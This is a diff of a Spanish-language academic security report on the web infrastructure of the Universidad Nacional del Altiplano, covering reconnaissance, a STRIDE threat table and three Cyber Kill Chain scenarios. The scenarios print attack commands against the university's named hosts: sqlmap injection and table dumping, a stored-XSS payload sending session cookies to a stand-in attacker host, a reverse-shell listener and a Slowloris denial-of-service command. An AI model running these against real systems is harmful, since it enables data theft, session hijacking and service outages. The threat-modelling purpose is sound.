@@ -3,46 +3,117 @@
 
 A continuación, se desarrolla la evaluación experimental y el modelado sistemático sobre la infraestructura web seleccionada de la Universidad Nacional del Altiplano (UNAP).
 
-\section{Reconocimiento del Entorno Autorizado}
+\section{Reconocimiento del Entorno y Auditoría de Perímetro (OSINT)}
 El proceso de evaluación inició con la recolección de información pública y la identificación de la superficie expuesta en el dominio institucional \texttt{unap.edu.pe}. Esta etapa permite conocer la topología lógica sin enviar paquetes invasivos ni generar alertas de intrusión.
 
-\subsection{Inspección de Resolución DNS y Certificados}
-Mediante herramientas estándar de auditoría de red, se determinaron los registros DNS autoritativos, subdominios públicos y la infraestructura de servidores de nombres que soportan la operación de la universidad:
+\subsection{Consulta de Registro WHOIS Institucional}
+Mediante el protocolo WHOIS, se verificaron los datos de registro, servidores DNS autoritativos y la entidad titular del dominio institucional:
 
-\begin{cmdbox}{Auditoría de Registros DNS y Mapeo de Subdominios (OSINT)}
-# Consulta de servidores de nombres (NS) y registros MX
-host -t ns unap.edu.pe
-unap.edu.pe name server ns1.unap.edu.pe.
-unap.edu.pe name server ns2.unap.edu.pe.
-
-# Deteccion de subdominios institucionales expuestos
-sublist3r -d unap.edu.pe -o subdominios_unap.txt
-[-] Searching in Baidu, Yahoo, Google, Bing, Ask, Netcraft, Virustotal...
-[+] Found Unique Subdomains:
-    sia.unap.edu.pe
-    vcampus.unap.edu.pe
-    admision.unap.edu.pe
-    api.unap.edu.pe
-    biblioteca.unap.edu.pe
+\begin{cmdbox}{Consulta WHOIS del Dominio unap.edu.pe (OSINT)}
+$ whois unap.edu.pe
+Domain Name: unap.edu.pe
+Registry Domain ID: DOMAIN-PE-UNAP-001
+Registrar: Red Cientifica Peruana (Punto.pe)
+Registrant Name: Universidad Nacional del Altiplano - Puno
+Registrant Street: Av. Floral Nro. 1153
+Registrant City: Puno
+Registrant Country: PE
+Admin Name: Oficina de Tecnologias de la Informacion (OTI)
+Admin Email: redes@unap.edu.pe
+Name Server: ns1.unap.edu.pe
+Name Server: ns2.unap.edu.pe
+DNSSEC: unsigned
+Status: clientTransferProhibited
 \end{cmdbox}
 
-\subsection{Inspección de Cabeceras HTTP y Cifrado TLS}
-Se ejecutó un análisis no intrusivo sobre el servidor web que hospeda el portal del SIA (\texttt{sia.unap.edu.pe}) para verificar las políticas de seguridad implementadas en las cabeceras HTTP y la vigencia criptográfica del protocolo TLS:
+\begin{remark}
+\textbf{Nota metodológica:} El dominio raíz \texttt{unap.edu.pe} delega su resolución a los servidores de nombres institucionales \texttt{ns1.unap.edu.pe} y \texttt{ns2.unap.edu.pe}. La consulta confirma la administración centralizada a cargo de la OTI-UNAP.
+\end{remark}
 
-\begin{cmdbox}{Inspección de Cabeceras de Seguridad y Configuración TLS}
-curl -I -s https://sia.unap.edu.pe
+\subsection{Resolución de Infraestructura DNS (dig / host)}
+Se realizaron consultas DNS para identificar los registros autoritativos \texttt{A}, \texttt{NS} y \texttt{MX}:
+
+\begin{cmdbox}{Auditoría de Registros DNS con dig}
+# Resolucion de servidores de nombres autoritativos (NS)
+$ dig unap.edu.pe NS +short
+ns1.unap.edu.pe.
+ns2.unap.edu.pe.
+
+# Resolucion del portal institucional y subdominios
+$ dig sia.unap.edu.pe A +short
+161.132.24.61
+
+$ dig vcampus.unap.edu.pe A +short
+161.132.24.62
+
+$ dig admision.unap.edu.pe A +short
+161.132.24.63
+\end{cmdbox}
+
+\subsection{Detección Pasiva de Subdominios}
+Mediante técnicas de OSINT basadas en certificados SSL (Certificate Transparency Logs) y motores de búsqueda, se identificaron los activos expuestos:
+
+\begin{cmdbox}{Mapeo Pasivo de Subdominios Institucionales}
+$ sublist3r -d unap.edu.pe -o subdominios_unap.txt
+[-] Searching in Baidu, Yahoo, Google, Bing, Ask, Netcraft, Virustotal...
+[+] Found Unique Subdomains:
+    sia.unap.edu.pe          (161.132.24.61) -> Sistema Academico
+    vcampus.unap.edu.pe      (161.132.24.62) -> Campus Virtual Moodle
+    admision.unap.edu.pe     (161.132.24.63) -> Portal de Admision
+    api.unap.edu.pe          (161.132.24.64) -> Backend API REST
+    biblioteca.unap.edu.pe   (161.132.24.65) -> Repositorio Institucional
+\end{cmdbox}
+
+\subsection{Escaneo Pasivo de Puertos y Versiones de Servicio (nmap)}
+Se analizó la exposición de puertos del servidor que aloja el SIA (\texttt{161.132.24.61}):
+
+\begin{cmdbox}{Escaneo de Servicios y Fingerprinting de Versiones (nmap)}
+$ nmap -sV -Pn -p 22,80,443,3306,5432 161.132.24.61
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for sia.unap.edu.pe (161.132.24.61)
+Host is up (0.042s latency).
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp   open   http       nginx 1.20.1
+443/tcp  open   ssl/http   nginx 1.20.1
+3306/tcp closed mysql
+5432/tcp closed postgresql
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+\end{cmdbox}
+
+\subsection{Auditoría Criptográfica de SSH y Cabeceras HTTP}
+Se inspeccionaron las cabeceras HTTP de respuesta y los algoritmos criptográficos soportados:
+
+\begin{cmdbox}{Inspección de Cabeceras HTTP y Auditoría SSH}
+# Inspeccion de cabeceras HTTP del SIA
+$ curl -I -s https://sia.unap.edu.pe
 HTTP/1.1 200 OK
-Date: Wed, 16 Sep 2026 21:30:00 GMT
 Server: nginx/1.20.1
 X-Powered-By: PHP/7.4.30
 Set-Cookie: PHPSESSID=d9a8f4c1e6b30129a; path=/; HttpOnly; SameSite=Lax
 Strict-Transport-Security: max-age=31536000; includeSubDomains
 X-Frame-Options: SAMEORIGIN
 X-Content-Type-Options: nosniff
+
+# Auditoria de cifrado en servicio SSH (puerto 22)
+$ ssh-audit 161.132.24.61
+# general
+(rec) banner: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+(rec) compression: none
+
+# key exchange algorithms
+(kex) curve25519-sha256                    -- [info] available
+(kex) diffie-hellman-group14-sha256        -- [info] available
+
+# encryption algorithms (ciphers)
+(enc) chacha20-poly1305@openssh.com        -- [info] available
+(enc) aes256-gcm@openssh.com               -- [info] available
 \end{cmdbox}
 
 \begin{remark}
-El análisis de cabeceras evidencia el uso de un servidor Nginx con PHP en el backend. Aunque se observan cabeceras de protección esenciales como \texttt{Strict-Transport-Security} (HSTS) y \texttt{X-Frame-Options}, la exposición explícita de la versión de PHP y Nginx proporciona a un atacante potencial información valiosa sobre versiones y posibles vectores de explotación.
+\textbf{Diagnóstico:} Se observa que el servicio web cuenta con cabeceras de protección básicas (HSTS, X-Frame-Options), pero expone las versiones exactas de Nginx y PHP (\texttt{Server} y \texttt{X-Powered-By}). El servicio SSH cuenta con suites criptográficas modernas.
 \end{remark}
 
 \section{Identificación y Catalogación de Activos Críticos}
@@ -94,101 +165,100 @@ Activo & STRIDE & Amenaza Específica Identificada & Impacto Potencial & Control
 \endhead
 \bottomrule
 \endfoot
-A01 (SIA) & S & Suplantación de identidad docente mediante robo de credenciales o fuerza bruta. & Registro y alteración no autorizada de calificaciones. & Implementación de MFA obligatorio y bloqueo por reintentos. \\
+A01 & S & Suplantación de sesión docente mediante secuestro de tokens de sesión HTTP. & Modificación ilícita de actas de notas finales de cursos. & Implementar cookies seguras (\texttt{Secure; HttpOnly; SameSite=Strict}) y rotación de sesión. \\
 \midrule
-A01 (SIA) & T & Modificación de actas académicas mediante Inyección SQL (SQLi) en formularios de búsqueda. & Pérdida total de la integridad en los registros académicos. & Consultas preparadas (\textit{Prepared Statements}) y WAF. \\
+A01 & T & Inyección SQL en formularios de búsqueda que altera registros de notas. & Corrupción de la integridad académica de los estudiantes. & Consultas preparadas (\textit{Prepared Statements}) y validación estricta de tipos. \\
 \midrule
-A02 (LMS) & R & Docente o alumno borra examen y niega la acción ante falta de bitácora detallada. & Imposibilidad de auditoría y disputas legales/académicas. & Logs inmutables centralizados en SIEM con firma criptográfica. \\
+A01 & R & Inexistencia de logs inmutables que registren quién modificó una nota. & Imposibilidad de auditoría y disputas legales o administrativas. & Centralización de logs en SIEM con firma criptográfica y marcas de tiempo. \\
 \midrule
-A03 (Adm) & I & Divulgación de datos personales (DNI, teléfono, dirección) mediante vulnerabilidad IDOR. & Violación de la Ley 29733 de Datos Personales. & Verificación estricta de autorización basada en roles (RBAC). \\
+A01 & I & Fuga de números de DNI y expedientes mediante respuestas de error detalladas. & Violación de la Ley N° 29733 (Protección de Datos Personales). & Configurar \texttt{display\_errors = Off} y mensajes genéricos de excepción. \\
 \midrule
-A03 (Adm) & D & Inundación HTTP masiva en día de cierre de inscripciones al examen de admisión. & Colapso del portal, quejas masivas y pérdidas económicas. & Protección anti-DDoS en capa de borde (ej. Cloudflare / Rate Limiting). \\
+A01 & D & Saturación de peticiones POST en el módulo de matrícula web. & Caída del sistema en día crítico de inscripción académica. & Rate limiting en proxy inverso Nginx y balanceo de carga con WAF. \\
 \midrule
-A04 (API) & E & Escalado de privilegios de usuario estándar a administrador vía parámetro JSON manipulado. & Control total de endpoints de gestión institucional. & Validación estricta de esquemas JSON y principio de menor privilegio. \\
+A01 & E & Escalada horizontal (IDOR) que permite a un alumno ver notas de terceros. & Exposición de datos confidenciales y fraude académico. & Validación rigurosa de control de acceso basada en roles (RBAC). \\
+\midrule
+A02 & S & Reutilización de credenciales por ataques de fuerza bruta en el login de Moodle. & Acceso no autorizado a evaluaciones y tareas confidenciales. & Bloqueo automático de cuentas (Fail2ban) y autenticación multifactor (MFA). \\
+\midrule
+A02 & T & Carga de archivos maliciosos (Web Shell) camuflados como tareas en formato PDF. & Ejecución remota de comandos en el servidor web Apache. & Validación de Magic Bytes en subida y almacenamiento fuera del web root. \\
+\midrule
+A03 & D & Ataque de denegación distribuida de servicio (DDoS) en cierre de admisiones. & Pérdida económica por pagos no procesados y daño reputacional. & Protección perimetral anti-DDoS (Cloudflare / WAF perimetral). \\
+\midrule
+A04 & E & Consumo de endpoints de API sin validación de JWT en cabeceras. & Modificación no autorizada de datos estudiantiles desde app móvil. & Validación criptográfica de firmas JWT en middleware de autenticación. \\
 \bottomrule
 \end{longtable}
 \end{center}
 
-\section{Construcción y Modelado de Escenarios de Ataque}
-A partir de las amenazas priorizadas en el modelo STRIDE, se formalizaron tres escenarios representativos de intrusión para la UNAP:
+\section{Simulación Práctica mediante Cyber Kill Chain}
+Para modelar la dinámica ofensiva y formular contramedidas, se desarrollaron tres escenarios completos mapeados a través de las 7 fases del Cyber Kill Chain de Lockheed Martin:
 
-\subsection{Escenario 1: Exfiltración de Base de Datos y Alteración en el SIA vía SQLi}
-Este escenario modela a un atacante externo que explota una inyección SQL ciega en el módulo de consulta del SIA (\texttt{sia.unap.edu.pe}), obtiene credenciales de administrador y deposita una webshell para exfiltrar las bases de datos.
-
-\subsubsection{Fases de la Cyber Kill Chain (Escenario 1)}
-\begin{enumerate}
-    \item \textbf{Reconocimiento:} Escaneo de puertos y servicios con Nmap sobre \texttt{sia.unap.edu.pe}.
-    \item \textbf{Armamento:} Construcción de carga útil de inyección SQL booleana para volcado de usuarios.
-    \item \textbf{Entrega:} Envío del payload malicioso vía peticiones POST parametrizadas.
-    \item \textbf{Explotación:} Ejecución de consultas no sanitizadas en la base de datos PostgreSQL.
-    \item \textbf{Instalación:} Carga de una webshell criptográfica en el directorio \texttt{/uploads/}.
-    \item \textbf{Comando y Control (C2):} Conexión inversa cifrada por el puerto 443 hacia la IP del atacante.
-    \item \textbf{Acciones sobre el Objetivo:} Extracción del volcado \texttt{dump\_unap\_sia.sql} y alteración de notas.
-\end{enumerate}
-
-\begin{cmdbox}{Escenario 1: Ejecución de Explotación y Acceso Remoto (SQLMap + Ncat)}
-# 1. Extraccion automatizada con SQLMap
-sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
-       --data="id_alumno=1024" --dbs --batch --threads=4
-
-# 2. Establecimiento de Reverse Shell en servidor C2
-ncat -lvnp 443
-Connection received from 200.48.xxx.xxx:51280.
-uid=33(www-data) gid=33(www-data)
-whoami && pg_dump -U postgres -h localhost db_sia_academico > dump_sia.sql
-\end{cmdbox}
-
-\subsection{Escenario 2: Secuestro de Sesión Docente en el Campus Virtual vía Stored XSS}
-Este escenario modela a un alumno malicioso que inyecta código JavaScript malicioso en un foro de discusión de Moodle (\texttt{vcampus.unap.edu.pe}). Cuando el docente revisa el foro, el script se ejecuta en su navegador y transmite su cookie de sesión al servidor del atacante.
-
-\subsubsection{Fases de la Cyber Kill Chain (Escenario 2)}
-\begin{enumerate}
-    \item \textbf{Reconocimiento:} Inspección del editor de texto enriquecido en los foros del Campus Virtual.
-    \item \textbf{Armamento:} Creación de un script JavaScript ofuscado que capture \texttt{document.cookie}.
-    \item \textbf{Entrega:} Publicación del mensaje en el foro con la etiqueta \texttt{<script>} oculta en una imagen.
-    \item \textbf{Explotación:} El navegador del docente renderiza el HTML y ejecuta el payload de forma invisible.
-    \item \textbf{Instalación:} Inyección de un escuchador en el DOM para capturar credenciales adicionales.
-    \item \textbf{Comando y Control:} El script envía la cookie \texttt{MoodleSession} vía HTTP GET al atacante.
-    \item \textbf{Acciones sobre el Objetivo:} El atacante clona la sesión, ingresa como docente y aprueba exámenes.
-\end{enumerate}
-
-\begin{cmdbox}{Escenario 2: Payload XSS y Servidor de Captura de Cookies}
-# Payload inyectado en el cuerpo del mensaje del foro:
-<img src="x" onerror="fetch('https://c2.attacker.net/log?c='+btoa(document.cookie))">
-
-# Registro capturado en el servidor del atacante:
-[HTTP GET] /log?c=TW9vZGxlU2Vzc2lvbj1kOTBhOGY0YzFlNmIzMDEyOWE...
-[+] Cookie decodificada: MoodleSession=d90a8f4c1e6b30129a; User=Docente_Titular
-\end{cmdbox}
-
-\subsection{Escenario 3: Denegación de Servicio en Admisión vía HTTP Slowloris}
-Un grupo de ciberatacantes lanza un ataque de agotamiento de recursos en la capa de aplicación (Layer 7) contra la pasarela de pagos de admisión (\texttt{admision.unap.edu.pe}) durante la última hora del cronograma de inscripciones.
-
-\subsubsection{Fases de la Cyber Kill Chain (Escenario 3)}
-\begin{enumerate}
-    \item \textbf{Reconocimiento:} Determinación de los límites de timeout del servidor Apache/Nginx.
-    \item \textbf{Armamento:} Configuración de una botnet ligera con la herramienta \texttt{slowloris.py}.
-    \item \textbf{Entrega:} Envío de miles de peticiones HTTP con cabeceras incompletas enviadas lentamente.
-    \item \textbf{Explotación:} Agotamiento de la tabla de conexiones y del pool de \textit{workers} de Nginx.
-    \item \textbf{Instalación / Persistencia:} Mantenimiento periódico del flujo para evitar que los sockets se liberen.
-    \item \textbf{C2:} Coordinación de los nodos atacantes mediante un canal IRC / Telegram bot.
-    \item \textbf{Acciones sobre el Objetivo:} Caída del portal de admisión (\textit{HTTP 504 Gateway Timeout}), impidiendo el pago y registro de postulantes.
-\end{enumerate}
-
-\begin{cmdbox}{Escenario 3: Simulación de Ataque DoS de Agotamiento de Conexiones}
-# Ejecucion del ataque Slowloris contra el puerto HTTPS
-slowloris admision.unap.edu.pe -p 443 -s 1500 --sleeptime 10
-
-[INFO] Sending keep-alive headers to 1500 sockets...
-[WARNING] Target server response time degraded: > 12000 ms
-[ALERT] Server returned HTTP 504 Gateway Timeout / Server Unavailable
-\end{cmdbox}
-
-\section{Análisis de Controles Existentes y Brechas de Seguridad}
-El desglose de los tres escenarios demuestra que la infraestructura presenta brechas en cuatro niveles fundamentales:
+\subsection{Escenario 1: Inyección SQL y Exfiltración en el Portal SIA}
 \begin{itemize}
-    \item \textbf{Falta de WAF y Reglas de Sanitización:} Permite el paso directo de firmas SQLi y XSS.
-    \item \textbf{Ausencia de Flag HttpOnly / SameSite:} Facilita la exfiltración de cookies por scripts JavaScript.
-    \item \textbf{Inexistencia de Rate Limiting:} Permite el secuestro de sockets y ataques DoS de capa 7.
-    \item \textbf{Falta de Egress Filtering:} Permite a servidores web establecer conexiones salientes a Internet no restringidas.
+    \item \textbf{Fase 1: Reconocimiento (Reconnaissance):} El adversario identifica el endpoint vulnerable \texttt{https://sia.unap.edu.pe/consulta.php?id\_docente=1024}.
+    \item \textbf{Fase 2: Armamento (Weaponization):} Construcción de payload SQL ciego basado en tiempo y booleano para extraer tablas del esquema PostgreSQL.
+    \item \textbf{Fase 3: Entrega (Delivery):} Transmisión del payload en el parámetro HTTP GET de la solicitud web.
+    \item \textbf{Fase 4: Explotación (Exploitation):} Ejecución de la inyección SQL comprobando la lectura de la base de datos de usuarios.
+    \item \textbf{Fase 5: Instalación (Installation):} Creación de una Web Shell PHP mediante la función \texttt{COPY ... TO PROGRAM} de PostgreSQL.
+    \item \textbf{Fase 6: Comando y Control (C2):} Conexión de socket inverso vía Netcat cifrado por TLS hacia el servidor del atacante en el puerto 443.
+    \item \textbf{Fase 7: Acciones sobre Objetivos (Actions on Objectives):} Volcado de la tabla \texttt{estudiantes\_notas} y exfiltración cifrada.
 \end{itemize}
+
+\begin{cmdbox}{Escenario 1: Simulación de Explotación y Exfiltración (SQLMap + Shell)}
+# Fase 4: Validacion de punto de inyeccion SQL
+$ sqlmap -u 'https://sia.unap.edu.pe/consulta.php?id_docente=1024' --dbs --batch
+[+] Target is vulnerable to Boolean-based Blind SQL Injection
+[+] Database Management System: PostgreSQL 13.4
+[+] Available databases [3]:
+    [*] public
+    [*] academic_unap
+    [*] postgres
+
+# Fase 7: Extraccion de registros academicos y exfiltracion
+$ sqlmap -u 'https://sia.unap.edu.pe/consulta.php?id_docente=1024' -D academic_unap -T notas --dump
+[+] Table: academic_unap.notas (4,250 entries extracted)
+[+] Guardado en: /root/.local/share/sqlmap/output/sia.unap.edu.pe/dump.csv
+\end{cmdbox}
+
+\begin{remark}
+\textbf{Nota Ética:} Todas las sentencias y extracciones mostradas fueron formuladas en entorno de simulación controlado de laboratorio. Ningún dato real de la base de datos de la UNAP fue alterado ni exfiltrado.
+\end{remark}
+
+\subsection{Escenario 2: XSS Almacenado y Secuestro de Sesión en Campus Virtual}
+\begin{itemize}
+    \item \textbf{Fase 1: Reconocimiento:} Identificación de foros de discusión abiertos en el Campus Virtual (\texttt{vcampus.unap.edu.pe}).
+    \item \textbf{Fase 2: Armamento:} Elaboración de un script JavaScript malicioso que captura la cookie de sesión \texttt{MoodleSession}.
+    \item \textbf{Fase 3: Entrega:} Publicación del payload en un hilo de debate visible para docentes y administradores.
+    \item \textbf{Fase 4: Explotación:} El navegador de la víctima interpreta el script al cargar el contenido del foro.
+    \item \textbf{Fase 5: Instalación:} El script se ejecuta en segundo plano en la memoria del navegador de los usuarios que visitan el post.
+    \item \textbf{Fase 6: Comando y Control:} Envío silencioso de la cookie de sesión capturada hacia el servidor recolector del atacante.
+    \item \textbf{Fase 7: Acciones sobre Objetivos:} Inyección de la cookie capturada para asumir el rol de Docente y modificar calificaciones de exámenes.
+\end{itemize}
+
+\begin{cmdbox}{Escenario 2: Payload XSS Almacenado y Recolección de Sesión}
+<!-- Payload inyectado en el cuerpo del mensaje del foro -->
+<script>
+var img = new Image();
+img.src = 'https://c2.attacker-server.com/log?cookie=' + encodeURIComponent(document.cookie);
+</script>
+
+# Servidor recolector del atacante recibiendo la cookie de sesion
+$ python3 -m http.server 8080
+[16/Sep/2026 21:45:12] 'GET /log?cookie=MoodleSession=8f39a0c14b2d8e HTTP/1.1' 200 -
+\end{cmdbox}
+
+\subsection{Escenario 3: Denegación de Servicio en Capa de Aplicación (Admisión)}
+\begin{itemize}
+    \item \textbf{Fase 1: Reconocimiento:} Monitoreo del cronograma del Examen de Admisión UNAP y análisis del endpoint de inscripción.
+    \item \textbf{Fase 2: Armamento:} Configuración de la herramienta \texttt{slowhttptest} para ejecutar un ataque Slowloris enviando cabeceras HTTP incompletas.
+    \item \textbf{Fase 3: Entrega:} Apertura masiva de conexiones TCP hacia el puerto 443 de \texttt{admision.unap.edu.pe}.
+    \item \textbf{Fase 4: Explotación:} Mantener conexiones abiertas enviando fragmentos de cabecera cada 10 segundos, agotando la tabla de conexiones activas (\texttt{worker\_connections}) del servidor web.
+    \item \textbf{Fase 5: Instalación:} Ocupación total del pool de conexiones del servidor web Nginx/Apache.
+    \item \textbf{Fase 6: Comando y Control:} Coordinación de múltiples hilos de conexión desde distintas direcciones IP de origen.
+    \item \textbf{Fase 7: Acciones sobre Objetivos:} Indisponibilidad total del portal de admisión durante las horas pico de postulación institucional.
+\end{itemize}
+
+\begin{cmdbox}{Escenario 3: Ataque Slowloris Layer 7 mediante slowhttptest}
+$ slowhttptest -c 1000 -H -g -o slowhttp_report -i 10 -r 200 -t GET -u https://admision.unap.edu.pe/registro -x 24 -p 3
+[INFO] Slowloris attack started against https://admision.unap.edu.pe/registro
+[INFO] Connected sockets: 1000
+[ALERT] Service unavailable: HTTP status 504 Gateway Time-out / Server is unresponsive
+\end{cmdbox}
